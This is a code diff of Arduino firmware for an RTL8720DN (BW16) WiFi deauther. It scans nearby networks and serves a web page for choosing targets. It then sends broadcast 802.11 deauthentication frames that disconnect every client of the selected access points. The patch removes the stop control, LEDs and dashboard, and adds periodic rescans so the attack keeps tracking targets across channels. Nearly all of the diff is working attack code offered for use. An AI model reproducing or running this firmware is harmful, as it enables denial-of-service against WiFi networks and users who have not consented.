@@ -8,11 +8,7 @@
 #include "WiFi.h"
 #include "WiFiServer.h"
 #include "WiFiClient.h"
-
-// LEDs:
-//  Red: System usable, Web server active etc.
-//  Green: Web Server communication happening
-//  Blue: Deauth-Frame being sent
+#include <array>
 
 typedef struct {
   String ssid;
@@ -22,24 +18,20 @@ typedef struct {
   uint8_t channel;
 } WiFiScanResult;
 
-char *ssid = "RTL8720dn-Deauther";
-char *pass = "0123456789";
+
+//Access point name and password, feel free to change:
+char *ssid = "RTL";
+char *pass = "changemeplease";
 
 int current_channel = 1;
 std::vector<WiFiScanResult> scan_results;
-std::map<int, std::vector<int>> deauth_channels;
-std::vector<int> chs_idx;
-uint32_t current_ch_idx = 0;
-uint32_t sent_frames = 0;
+std::vector<std::array<uint8_t, 6>> deauth_bssids;
 
 WiFiServer server(80);
 uint8_t deauth_bssid[6];
 uint16_t deauth_reason = 2;
 
-int frames_per_deauth = 5;
-int send_delay = 5;
-bool isDeauthing = false;
-bool led = true;
+#define FRAMES_PER_DEAUTH 5
 
 rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
   rtw_scan_result_t *record;
@@ -73,55 +65,51 @@ int scanNetworks() {
 }
 
 String parseRequest(String request) {
-  int path_start = request.indexOf(' ');
-  if (path_start < 0) return "/";
-  path_start += 1;
+  int path_start = request.indexOf(' ') + 1;
   int path_end = request.indexOf(' ', path_start);
-  if (path_end < 0) return "/";
   return request.substring(path_start, path_end);
 }
 
 std::vector<std::pair<String, String>> parsePost(String &request) {
-    std::vector<std::pair<String, String>> post_params;
+  std::vector<std::pair<String, String>> post_params;
 
-    // Find the start of the body
-    int body_start = request.indexOf("\r\n\r\n");
-    if (body_start == -1) {
-        return post_params; // Return an empty vector if no body found
-    }
-    body_start += 4;
-
-    // Extract the POST data
-    String post_data = request.substring(body_start);
-
-    int start = 0;
-    int end = post_data.indexOf('&', start);
-
-    // Loop through the key-value pairs
-    while (end != -1) {
-        String key_value_pair = post_data.substring(start, end);
-        int delimiter_position = key_value_pair.indexOf('=');
-
-        if (delimiter_position != -1) {
-            String key = key_value_pair.substring(0, delimiter_position);
-            String value = key_value_pair.substring(delimiter_position + 1);
-            post_params.push_back({key, value}); // Add the key-value pair to the vector
-        }
-
-        start = end + 1;
-        end = post_data.indexOf('&', start);
-    }
-
-    // Handle the last key-value pair
-    String key_value_pair = post_data.substring(start);
-    int delimiter_position = key_value_pair.indexOf('=');
-    if (delimiter_position != -1) {
-        String key = key_value_pair.substring(0, delimiter_position);
-        String value = key_value_pair.substring(delimiter_position + 1);
-        post_params.push_back({key, value});
-    }
-
+  // Find the start of the body
+  int body_start = request.indexOf("\r\n\r\n");
+  if (body_start == -1) {
     return post_params;
+  }
+  body_start += 4;
+
+  // Extract the POST data
+  String post_data = request.substring(body_start);
+
+  int start = 0;
+  int end = post_data.indexOf('&', start);
+
+  while (end != -1) {
+    String key_value_pair = post_data.substring(start, end);
+    int delimiter_position = key_value_pair.indexOf('=');
+
+    if (delimiter_position != -1) {
+      String key = key_value_pair.substring(0, delimiter_position);
+      String value = key_value_pair.substring(delimiter_position + 1);
+      post_params.push_back({ key, value });
+    }
+
+    start = end + 1;
+    end = post_data.indexOf('&', start);
+  }
+
+  // Handle the last key-value pair
+  String key_value_pair = post_data.substring(start);
+  int delimiter_position = key_value_pair.indexOf('=');
+  if (delimiter_position != -1) {
+    String key = key_value_pair.substring(0, delimiter_position);
+    String value = key_value_pair.substring(delimiter_position + 1);
+    post_params.push_back({ key, value });
+  }
+
+  return post_params;
 }
 
 String makeResponse(int code, String content_type) {
@@ -197,19 +185,19 @@ void handleRoot(WiFiClient &client) {
       </style>
   </head>
   <body>
-      <h1>RTL8720dn-Deauther</h1>
+      <h1>RTL8720DN BW16 - Deauther with rescan</h1>
 
-      <h2>WiFi Networks</h2>
+      <h2>WiFis</h2>
       <form method="post" action="/deauth">
           <table>
               <tr>
                   <th>Select</th>
-                  <th>Number</th>
+                  <th>No</th>
                   <th>SSID</th>
                   <th>BSSID</th>
                   <th>Channel</th>
                   <th>RSSI</th>
-                  <th>Frequency</th>
+                  <th>Freq</th>
               </tr>
   )";
 
@@ -229,85 +217,12 @@ void handleRoot(WiFiClient &client) {
         </table>
           <p>Reason code:</p>
           <input type="text" name="reason" value="2">
-          <input type="submit" value="Launch Attack">
-      </form>
-
-      <h2>Dashboard</h2>
-    <table>
-      <tr><th>Name</th><th>Value</th></tr>
-  )";
-
-  response += "<tr><td>Attack Status</td><td>" + String(isDeauthing ? "Running" : "Stop") + "</th></tr>";
-  response += "<tr><td>LED Switch</td><td>" + String(led ? "ON" : "OFF") + "</th></tr>";
-  response += "<tr><td>Sent Frames</td><td>" + String(sent_frames) + "</th></tr>";
-  response += "<tr><td>Send Delay</td><td>" + String(send_delay) + "</th></tr>";
-  response += "<tr><td>Frames Per Deauth</td><td>" + String(frames_per_deauth) + "</th></tr>";
-
-  response += R"(
-    </table>
-      <h2>Control Panel</h2>
-      <form method="post" action="/setframes">
-          <input type="text" name="frames" placeholder="Frames per deauth">
-          <input type="submit" value="Set frames per deauth">
-      </form>
-
-      <form method="post" action="/setdelay">
-          <input type="text" name="delay" placeholder="Send delay">
-          <input type="submit" value="Set send delay">
+          <input type="submit" value="DEAUTH">
       </form>
 
       <form method="post" action="/rescan">
-          <input type="submit" value="Rescan networks">
+          <input type="submit" value="Scan again">
       </form>
-
-      <form method="post" action="/stop">
-          <input type="submit" value="Stop Attack">
-      </form>
-
-      <form method="post" action="/led_enable">
-          <input type="submit" value="LED enable">
-      </form>
-
-      <form method="post" action="/led_disable">
-          <input type="submit" value="LED disable">
-      </form>
-
-      <form method="post" action="/refresh">
-          <input type="submit" value="Refresh page">
-      </form>
-
-      <h2>Reason Codes</h2>
-    <table>
-        <tr>
-            <th>Code</th>
-            <th>Meaning</th>
-        </tr>
-        <tr><td>0</td><td>Reserved.</td></tr>
-        <tr><td>1</td><td>Unspecified reason.</td></tr>
-        <tr><td>2</td><td>Previous authentication no longer valid.</td></tr>
-        <tr><td>3</td><td>Deauthenticated because sending station (STA) is leaving or has left Independent Basic Service Set (IBSS) or ESS.</td></tr>
-        <tr><td>4</td><td>Disassociated due to inactivity.</td></tr>
-        <tr><td>5</td><td>Disassociated because WAP device is unable to handle all currently associated STAs.</td></tr>
-        <tr><td>6</td><td>Class 2 frame received from nonauthenticated STA.</td></tr>
-        <tr><td>7</td><td>Class 3 frame received from nonassociated STA.</td></tr>
-        <tr><td>8</td><td>Disassociated because sending STA is leaving or has left Basic Service Set (BSS).</td></tr>
-        <tr><td>9</td><td>STA requesting (re)association is not authenticated with responding STA.</td></tr>
-        <tr><td>10</td><td>Disassociated because the information in the Power Capability element is unacceptable.</td></tr>
-        <tr><td>11</td><td>Disassociated because the information in the Supported Channels element is unacceptable.</td></tr>
-        <tr><td>12</td><td>Disassociated due to BSS Transition Management.</td></tr>
-        <tr><td>13</td><td>Invalid element, that is, an element defined in this standard for which the content does not meet the specifications in Clause 8.</td></tr>
-        <tr><td>14</td><td>Message integrity code (MIC) failure.</td></tr>
-        <tr><td>15</td><td>4-Way Handshake timeout.</td></tr>
-        <tr><td>16</td><td>Group Key Handshake timeout.</td></tr>
-        <tr><td>17</td><td>Element in 4-Way Handshake different from (Re)Association Request/ Probe Response/Beacon frame.</td></tr>
-        <tr><td>18</td><td>Invalid group cipher.</td></tr>
-        <tr><td>19</td><td>Invalid pairwise cipher.</td></tr>
-        <tr><td>20</td><td>Invalid AKMP.</td></tr>
-        <tr><td>21</td><td>Unsupported RSNE version.</td></tr>
-        <tr><td>22</td><td>Invalid RSNE capabilities.</td></tr>
-        <tr><td>23</td><td>IEEE 802.1X authentication failed.</td></tr>
-        <tr><td>24</td><td>Cipher suite rejected because of the security policy.</td></tr>
-    </table>
   </body>
   </html>
   )";
@@ -327,9 +242,12 @@ void setup() {
   pinMode(LED_B, OUTPUT);
 
   DEBUG_SER_INIT();
-  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
 
-  scanNetworks();
+
+  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
+  if (scanNetworks()) {
+    delay(50);
+  }
 
 #ifdef DEBUG
   for (uint i = 0; i < scan_results.size(); i++) {
@@ -344,21 +262,20 @@ void setup() {
 #endif
 
   server.begin();
-
-  if (led) {
-    digitalWrite(LED_R, HIGH);
-  }
 }
+
+uint32_t last_scan_time = 0;
+#define SCAN_INTERVAL 120000
+
+
 
 void loop() {
   WiFiClient client = server.available();
   if (client.connected()) {
-    if (led) {
-      digitalWrite(LED_G, HIGH);
-    }
     String request;
     while (client.available()) {
-      request += (char)client.read();
+      while (client.available()) request += (char)client.read();
+      delay(1);
     }
     DEBUG_SER_PRINT(request);
     String path = parseRequest(request);
@@ -368,99 +285,87 @@ void loop() {
       handleRoot(client);
     } else if (path == "/rescan") {
       client.write(makeRedirect("/").c_str());
-      scanNetworks();
+      while (scanNetworks()) {
+        delay(1000);
+      }
     } else if (path == "/deauth") {
       std::vector<std::pair<String, String>> post_data = parsePost(request);
-      deauth_channels.clear();
-      chs_idx.clear();
-      for (auto &param : post_data) {
-        if (param.first == "network") {
-          int idx = String(param.second).toInt();
-          int ch = scan_results[idx].channel;
-          deauth_channels[ch].push_back(idx);
-          chs_idx.push_back(ch);
-        } else if (param.first == "reason") {
-          deauth_reason = String(param.second).toInt();
+      if (post_data.size() >= 2) {
+        for (auto &param : post_data) {
+          if (param.first == "network") {
+            int network_index = String(param.second).toInt();
+            deauth_bssids.push_back(std::array<uint8_t, 6>{
+              scan_results[network_index].bssid[0],
+              scan_results[network_index].bssid[1],
+              scan_results[network_index].bssid[2],
+              scan_results[network_index].bssid[3],
+              scan_results[network_index].bssid[4],
+              scan_results[network_index].bssid[5] });
+          } else if (param.first == "reason") {
+            deauth_reason = String(param.second).toInt();
+          }
         }
       }
-      if (!deauth_channels.empty()) {
-        isDeauthing = true;
-      }
-      client.write(makeRedirect("/").c_str());
-    } else if (path == "/setframes") {
-      std::vector<std::pair<String, String>> post_data = parsePost(request);
-      for (auto &param : post_data) {
-        if (param.first == "frames") {
-          int frames = String(param.second).toInt();
-          frames_per_deauth = frames <= 0 ? 5 : frames;
-        }
-      }
-      client.write(makeRedirect("/").c_str());
-    } else if (path == "/setdelay") {
-      std::vector<std::pair<String, String>> post_data = parsePost(request);
-      for (auto &param : post_data) {
-        if (param.first == "delay") {
-          int delay = String(param.second).toInt();
-          send_delay = delay <= 0 ? 5 : delay;
-        }
-      }
-      client.write(makeRedirect("/").c_str());
-    } else if (path == "/stop") {
-      deauth_channels.clear();
-      chs_idx.clear();
-      isDeauthing = false;
-      client.write(makeRedirect("/").c_str());
-    } else if (path == "/led_enable") {
-      led = true;
-      digitalWrite(LED_R, HIGH);
-      client.write(makeRedirect("/").c_str());
-    } else if (path == "/led_disable") {
-      led = false;
-      digitalWrite(LED_R, LOW);
-      digitalWrite(LED_G, LOW);
-      digitalWrite(LED_B, LOW);
-      client.write(makeRedirect("/").c_str());
-    } else if (path == "/refresh") {
-      client.write(makeRedirect("/").c_str());
     } else {
       handle404(client);
     }
 
     client.stop();
-    if (led) {
-      digitalWrite(LED_G, LOW);
+  }
+
+  uint32_t current_time = millis();
+  uint32_t diff = current_time - last_scan_time;
+  
+  if (diff >= SCAN_INTERVAL) {
+    last_scan_time = current_time;
+    DEBUG_SER_PRINT("Rescanning...\n");
+
+    if (deauth_bssids.size()) {
+      if (scanNetworks() == 0) {
+        DEBUG_SER_PRINT("Rescanned.\n");
+      } else {
+        DEBUG_SER_PRINT("Failed to rescan!\n");
+      }
     }
   }
-  
-  if (isDeauthing && !deauth_channels.empty()) {
-    for (auto& group : deauth_channels) {
-      int ch = group.first;
-      if (ch == chs_idx[current_ch_idx]) {
-        wext_set_channel(WLAN0_NAME, ch);
 
-        std::vector<int>& networks = group.second;
+  while ((deauth_bssids.size() > 0) && (diff < SCAN_INTERVAL)) {
 
-        for (int i = 0; i < frames_per_deauth; i++) {
-          if (led) {
-            digitalWrite(LED_B, HIGH);
+    current_time = millis();
+    diff = current_time - last_scan_time;
+      
+    for (const auto &bssid : deauth_bssids) {
+      memcpy(deauth_bssid, bssid.data(), 6);
+      int netFound = 0;
+      for (const auto &result : scan_results) {
+        if (memcmp(result.bssid, bssid.data(), 6) == 0) {
+          DEBUG_SER_PRINT("\nDeauth channel:");
+          DEBUG_SER_PRINT(result.channel);
+          DEBUG_SER_PRINT("\n");
+          wext_set_channel(WLAN0_NAME, result.channel);
+          netFound = 1;
+          break;
+        }
+      }
+      if (netFound) {
+        DEBUG_SER_PRINT("Deauth_bssid to be attacked: ");
+        for (int i = 0; i < 6; i++) {
+          if (i > 0) {
+            DEBUG_SER_PRINT(":");
           }
-          for (int idx : networks) {
-            memcpy(deauth_bssid, scan_results[idx].bssid, 6);
-            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
-            sent_frames++;
+          if (deauth_bssid[i] < 16) {
+            DEBUG_SER_PRINT("0");
           }
-          delay(send_delay);
-          if (led) {
-            digitalWrite(LED_B, LOW);
-          }
+          DEBUG_SER_PRINT(deauth_bssid[i], HEX);
+        }
+        DEBUG_SER_PRINT("\n");
+
+        for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
+          wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
         }
       }
     }
-    current_ch_idx++;
-    if (current_ch_idx >= chs_idx.size()) {
-      current_ch_idx=0;
-    }
-  }
 
-  wext_set_channel(WLAN0_NAME, current_channel);
+    delay(50);
+  }
 }
